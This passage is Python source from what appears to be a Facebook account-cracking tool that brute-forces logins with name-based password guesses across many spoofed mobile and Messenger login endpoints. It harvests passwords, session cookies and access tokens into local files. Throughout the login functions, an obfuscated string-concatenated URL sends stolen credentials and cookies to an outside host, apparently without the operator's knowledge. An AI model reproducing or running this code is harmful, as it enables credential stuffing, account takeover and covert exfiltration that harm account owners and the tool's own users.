                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-sim-hni": str(random.randint(20000,40000)),
                "x-fb-net-hni": str(random.randint(20000,40000)),
                "content-type": "application/x-www-form-urlencoded",
                "x-graphql-client-library": "graphservice",
                "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "x-tigon-is-retry": "False",
                "x-fb-privacy-context": "3643298472347298",
                "x-graphql-request-purpose": "fetch",
                "x-fb-device-group": str(random.randint(2000,4000)),
                "x-zero-eh": "664c0faaac849cb891d0a261fbb72a12",
                "x-zero-state": "unknown",
                "x-fb-connection-type": "WIFI",
                "x-fb-rmd": "fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=-994;recvTime=4160",
                "x-fb-request-analytics-tags": "{\"network_tags\":{\"product\":\"350685531728\",\"purpose\":\"fetch\",\"request_category\":\"graphql\",\"retry_attempt\":\"0\"},\"application_tags\":\"graphservice\"}",
                "x-fb-http-engine": "Tigon/Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True",
                "Content-Length": "1966"}
            url='https://graph.facebook.com/graphql'
            rq=str(requests.post(url,data=edata, headers=head).text)
            if "session_key" in rq:
                data_coki=rq.replace(symbolsx,"")
                c_user=re.search('"c_user","value":"(.*?)",', str(data_coki)).group(1)
                xs=re.search('"xs","value":"(.*?)",', str(data_coki)).group(1)
                fr=re.search('"fr","value":"(.*?)",', str(data_coki)).group(1)
                datr=re.search('"datr","value":"(.*?)",', str(data_coki)).group(1)
                coki="c_user="+c_user+";xs="+xs+";fr="+fr+";datr="+datr
                xd=c_user
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n") 
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck("RND",qw,xd,ps,coki,id_token,pw)
                    break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        
        


def api_renmeth(uid,pwx,tl,qw):
    global oks,loop,koki,lock,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        for pw in pwx:
            ps=number_pas(uid,pw)
            ua=mas.met(qw)
            data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid, 
            'password': "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate'}
            head = {
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': ua,
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger',}
            rq = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            if rq['is_account_confirmed'] == False:
                                open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                            else:
                                open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                                open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n") 
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token=rq['access_token']
                            open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                            live_ck("RND",qw,xd,ps,coki,id_token,pw)
                    break
            elif "user must verify" in str(rq).lower():
                xd=str(rq['error']['error_data']['uid'])
                cpp.append(xd)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(xd+"|"+ps+"\n")
                open(cp_today,"a").write(xd+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+xd+"&ps="+ps+f"&types={optionname}&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        



def crack2():
    global XODE
    apprRucrl_ck()
    pwx=[]
    clr()
    print(logo)
    print("  [b white]Π Example   >>[spring_green1] /sdcard/savage.txt ")
    try:user=open(input("  Π File Path >> "),"r").read().splitlines()
    except:crack2()
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] MANUAL PASSWORD  ") 
    print("[b white]  [[spring_green1]2[b white]] AUTO PASSWORD  ")
    print(" "+line)
    autopass=input("  Π ->> ")
    if autopass in ["1"]:
        try:
            print(" "+line)
            passlimit=int(input("  Π How Many Pass You Want To Add : "))
        except:passlimit=5
        print(" "+line)
        for x in range(passlimit):
            print("  [b white]Π Example   >>[spring_green1] first123 firstlast ")
            passlimit=str(input("  Π Password  >> "))
            if passlimit not in pwx:
                pwx.append(passlimit)
            print(" "+line)
        passcap(pwx)
    else:
        print(" "+line)
        for zx in ["first123","first@123","first12345","first123456","first@12345","firstlast","First123","First@123","First12345","last123","firstlast123","first last","first123456789","last@123","first 1234","first 123","first"]:
            pwx.append(zx)
    print("[b white]  [[spring_green1]1[b white]] Method   ") 
    print("[b white]  [[spring_green1]2[b white]] Method   ")
    print("[b white]  [[spring_green1]3[b white]] Method   ")
    print("[b white]  [[spring_green1]4[b white]] Method   ")
    print("[b white]  [[spring_green1]5[b white]] Method   ")
    print("[b white]  [[spring_green1]6[b white]] Method   ")
    print("[b white]  [[spring_green1]7[b white]] Method   ")
    print("[b white]  [[spring_green1]8[b white]] Method   ")
    print("[b white]  [[spring_green1]9[b white]] Method   ")
    print("[b white]  [[spring_green1]10[b white]] Method   ")
    print("[b white]  [[spring_green1]11[b white]] Method   ")
    print("[b white]  [[spring_green1]12[b white]] Method   ")
    print("[b white]  [[spring_green1]13[b white]] Method   ")
    print("[b white]  [[spring_green1]14[b white]] Method   ")
    print("[b white]  [[spring_green1]15[b white]] Method   ")
    print("[b white]  [[spring_green1]16[b white]] Method   ")
    print(" "+line)
    qw=input("  Π ->> ")
    print(" "+line)
    try:
        print("  Π [green1]BEST RECOMMENDED SPEED 30 to 50")
        speed=int(input("  Π Enter Speed Between 10 to 70 : "))
    except:
        speed=30
    tl=str(len(user))
    shower2()
    with ThreadPool(max_workers=speed) as xx:
        
        run_time_info(qw,'FILE')
        clr()
        print(logo)
        print(f"[b white]   [red1]➜[/red1] Total account : [green1]{tl}")
        print(f"[b white]   [red1]➜[/red1] [bright_white]Use Flight Mode ……[/bright_white]")
        print(" "+line)
        
        XODE+="FILE"
        for xd in user:
            uid,names=xd.split("|")
            if qw in ["8"]:
                xx.submit(filemeth8,uid,names,pwx,tl,qw)
            elif qw in ["7"]:
                xx.submit(filemeth7,uid,names,pwx,tl,qw)
            elif qw in ["6"]:
                xx.submit(filemeth6,uid,names,pwx,tl,qw)
            elif qw in ["9"]:
                xx.submit(filemeth9,uid,names,pwx,tl,qw)
            elif qw in ["10"]:
                xx.submit(filemeth10,uid,names,pwx,tl,qw)
            elif qw in ["12"]:
                xx.submit(filemeth12,uid,names,pwx,tl,qw)
            elif qw in ["11"]:
                xx.submit(filemeth11,uid,names,pwx,tl,qw)
            elif qw in ["13"]:
                xx.submit(filemeth13,uid,names,pwx,tl,qw)
            elif qw in ["14"]:
                xx.submit(filemeth14,uid,names,pwx,tl,qw)
            elif qw in ["15"]:
                xx.submit(filemeth15,uid,names,pwx,tl,qw)
            elif qw in ["16"]:
                xx.submit(file_messanger,uid,names,pwx,tl,qw)
            elif qw in ["5"]:
                xx.submit(filemeth5,uid,names,pwx,tl,qw)
            elif qw in ["4"]:
                xx.submit(filemeth4,uid,names,pwx,tl,qw)
            elif qw in ["3"]:
                xx.submit(filemeth3,uid,names,pwx,tl,qw)
            elif qw in ["2"]:
                xx.submit(filemeth2,uid,names,pwx,tl,qw)
            else:
                xx.submit(filemeth,uid,names,pwx,tl,qw)
    print(" "+line)
    print("[b white]   [red1]➜[/red1] TOTAL OK      [yellow]>[bright_green]>[dark_orange3]>[white][spring_green1]   "+str(len(oks)))
    print(f"[b white]   [red1]➜[/red1] SAVED IN  [red1 on white]SVG/SAVAGE-{optionname}-M{qw}-OK.txt[/red1 on white]")
    print(" "+line)
    again_crack()







def Username_genarator(user,importfile):
    for ids in importfile:
        try:
            name=ids.split("|")[1].replace(".",'')
            if is_english_only(name):
                firstname=name.split(" ")[0]
                lastname=name.split(" ")[1]
                number=str(random.randint(1,500))
                npm=''.join(random.choice(string.digits) for _ in range(1))
                username=name.lower().strip().replace(" ",".")
                en1=username+"."+number+f"|{firstname} {lastname}"
                en2=firstname.lower()+"."+number+f"|{firstname} {lastname}"
                en3=username+f"|{firstname} {lastname}"
                en4=username+"."+npm+f"|{firstname} {lastname}"
                en=random.choice([en1,en2,en3,en4])
                if en not in user:
                    user.append(en)
                else:
                    pass
                sys.stdout.write(f"\r    Dumping - {str(len(user))} \r "),sys.stdout.flush()
        except:
            pass





def Username_genarator2(user,importfile):
    for ids in importfile:
        try:
            name=ids.split("|")[1].replace(".",'')
            if is_english_only(name):
                firstname=name.split(" ")[0]
                lastname=name.split(" ")[1]
                username=name.lower().strip().replace(" ",".")
                en=username+"|"+f"{firstname} {lastname}"
                if en not in user:
                    user.append(en)
                else:
                    pass
                sys.stdout.write(f"\r    Dumping - {str(len(user))} \r "),sys.stdout.flush()
        except:
            pass
            


def Username_genarator3(user,importfile):
    for ids in importfile:
        try:
            name=ids.split("|")[1].replace(".",'')
            if is_english_only(name):
                firstname=name.split(" ")[0]
                lastname=name.split(" ")[1]
                npm=''.join(random.choice(string.digits) for _ in range(1))
                username=name.lower().strip().replace(" ",".")
                en1=username+npm+f"|{firstname} {lastname}"
                en2=username+f"|{firstname} {lastname}"
                en=random.choice([en1,en2])
                if en not in user:
                    user.append(en)
                else:
                    pass
                sys.stdout.write(f"\r    Dumping - {str(len(user))} \r "),sys.stdout.flush()
        except:
            pass



def crack_brute():
    global XODE
    apprRucrl_ck()
    password=[]
    user=[]
    clr()
    print(logo)
    print("  [b red1]Name will automatically Import from file")
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] Brute V1 (MIX)  ") 
    print("[b white]  [[spring_green1]2[b white]] Brute V2 (Only username)  ")
    print("[b white]  [[spring_green1]3[b white]] Brute V3 (username+ 1digit)  ")
    print(" "+line)
    bruteVerson=input("  Π ->> ")
    print(" "+line)
    try:
        print("  [b white]Π Example   >>[spring_green1] /sdcard/used_file.txt ")
        importfile=open(input("  Π File Path >> "),"r").read().splitlines()
        if bruteVerson in ["1"]:
            Username_genarator(user,importfile)
        elif bruteVerson in ['2']:
            Username_genarator2(user,importfile)
        else:
            Username_genarator3(user,importfile)
    except:crack_brute()
    
    
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] MANUAL PASSWORD  ") 
    print("[b white]  [[spring_green1]2[b white]] AUTO PASSWORD  ")
    print(" "+line)
    autopass=input("  Π ->> ")
    if autopass in ["1"]:
        try:
            print(" "+line)
            passlimit=int(input("  Π How Many Pass You Want To Add : "))
        except:passlimit=5
        print(" "+line)
        for x in range(passlimit):
            print("  [b white]Π Example   >>[spring_green1] first123 firstlast first1234 ")
            passlimit=str(input("  Π Password  >> "))
            if passlimit not in password:
                password.append(passlimit)
            print(" "+line)
        passcap(password)
    else:
        print(" "+line)
        for zx in ["first123","first@123","first12345","first123456","first@12345","firstlast","First123","First@123","First12345","last123","firstlast123","first last","first123456789","last@123","first 1234","first 123","first"]:
            password.append(zx)
        
    print("[b white]  [[spring_green1]1[b white]] Method   ") 
    print("[b white]  [[spring_green1]2[b white]] Method   ")
    print("[b white]  [[spring_green1]3[b white]] Method   ")
    print("[b white]  [[spring_green1]4[b white]] Method   ")
    print("[b white]  [[spring_green1]5[b white]] Method   ")
    print("[b white]  [[spring_green1]6[b white]] Method   ")
    print("[b white]  [[spring_green1]7[b white]] Method   ")
    print("[b white]  [[spring_green1]8[b white]] Method   ")
    print("[b white]  [[spring_green1]9[b white]] Method   ")
    
    print("[b white]  [[spring_green1]10[b white]] Method   ")
    print("[b white]  [[spring_green1]11[b white]] Method   ")
    print("[b white]  [[spring_green1]12[b white]] Method   ")
    print("[b white]  [[spring_green1]13[b white]] Method   ")
    print("[b white]  [[spring_green1]14[b white]] Method   ")
    print("[b white]  [[spring_green1]15[b white]] Method   ")
    
    print(" "+line)
    qw=input("  Π ->> ")
    print(" "+line)
    try:
        print("  Π [green1]BEST RECOMMENDED SPEED 30 to 50")
        speed=int(input("  Π Enter Speed Between 10 to 70 : "))
    except:
        speed=30
    tl=str(len(user))
    shower2()
    with ThreadPool(max_workers=speed) as xx:
        
        run_time_info(qw,'brute2.0')
        clr()
        print(logo)
        print(f"[b white]   [red1]➜[/red1] Total account : [green1]{tl}")
        print(f"[b white]   [red1]➜[/red1] [bright_white]Use Flight Mode ……[/bright_white]")
        print(" "+line)
        
        XODE+="brute2.0"
        for xd in user:
            uid,names=xd.split("|")
            f1,l1=names.split(" ")
            pwx=[]
            for pwd in password:
                ps=pwd.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
                pwx.append(ps)
            
            if qw in ["1"]:
                xx.submit(host_facebookX,uid,pwx,tl,qw)
            elif qw in ["2"]:
                xx.submit(host_facebookXX,uid,pwx,tl,qw)
            elif qw in ["3"]:
                xx.submit(host_facebookXXX,uid,pwx,tl,qw)
            elif qw in ["4"]:
                xx.submit(host_facebookXXXX,uid,pwx,tl,qw)
            elif qw in ["6"]:
                xx.submit(renmeth6,uid,pwx,tl,qw)
            elif qw in ["7"]:
                xx.submit(renmeth78,uid,pwx,tl,qw)
            elif qw in ["8"]:
                xx.submit(api_renmeth,uid,pwx,tl,qw)
            elif qw in ["9"]:
                xx.submit(host_messanger,uid,pwx,tl,qw)
            elif qw in ["10"]:
                xx.submit(host_messanger_android,uid,pwx,tl,qw)
            elif qw in ["11"]:
                xx.submit(host_messanger_android_2,uid,pwx,tl,qw)
            elif qw in ["12"]:
                xx.submit(host_messanger_iphone,uid,pwx,tl,qw)
            elif qw in ["13"]:
                xx.submit(host_messanger_windows,uid,pwx,tl,qw)
            elif qw in ["14"]:
                xx.submit(host_messanger_MAC,uid,pwx,tl,qw)
            elif qw in ["15"]:
                xx.submit(b_graph_renmeth,uid,pwx,tl,qw)
            else:
                xx.submit(graph_renmeth,uid,pwx,tl,qw)
            
    print(" "+line)
    print("[b white]   [red1]➜[/red1] TOTAL OK      [yellow]>[bright_green]>[dark_orange3]>[white][spring_green1]   "+str(len(oks)))
    print(f"[b white]   [red1]➜[/red1] SAVED IN  [red1 on white]SVG/SAVAGE-{optionname}-M{qw}-OK.txt[/red1 on white]")
    print(" "+line)
    again_crack()
    







def filemeth(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        for pw in pwx:
            ua=mas.met2(qw)
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            data = {
            "adid": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "email": uid,
            "password": "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            "cpl": 'true',
            "credentials_type": 'device_based_login_password',
            "source": "device_based_login",
            "error_detail_type": 'button_with_disabled',
            "format": 'json',
            "generate_session_cookies": '1',
            "generate_analytics_claim": '1',
            "generate_machine_id": '1',
            "locale": "en_US",
            "client_country_code": "US",
            "device_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-connection-type': 'unknown',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent': ua,
            'x-fb-net-hni': str(random.randint(20000,40000)),
            'x-fb-sim-hni': str(random.randint(20000,40000)),
            'x-fb-connection-bandwidth': str(random.randint(20000000,40000000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-friendly-name': 'authenticate',
            'accept-encoding': 'gzip, deflate',
            'x-fb-http-engine': 'Liger'}
            url= 'https://api.facebook.com/method/auth.login'
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    if rq['is_account_confirmed'] == False:
                        open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    else:
                        open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                        open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token=rq['access_token']
                    open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "user must verify" in str(rq).lower():
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)




def filemeth2(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        for pw in pwx:
            ua=mas.met2(qw)
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url="https://graph.facebook.com/auth/login"
            rq=requests.post(url,data=data,headers=headers).json()
            if "session_key" in rq:
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    if rq['is_account_confirmed'] == False:
                        open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    else:
                        open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                        open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token=rq['access_token']
                    open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "user must verify" in str(rq).lower():
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)






def filemeth3(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        for pw in pwx:
            ua=mas.met2(qw)
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'b-graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url="https://b-graph.facebook.com/auth/login"
            rq=requests.post(url,data=data,headers=headers).json()
            if "session_key" in rq:
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    if rq['is_account_confirmed'] == False:
                        open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    else:
                        open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                        open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token=rq['access_token']
                    open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "user must verify" in str(rq).lower():
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        


def filemeth4(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        for pw in pwx:
            ua=mas.met2(qw)
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
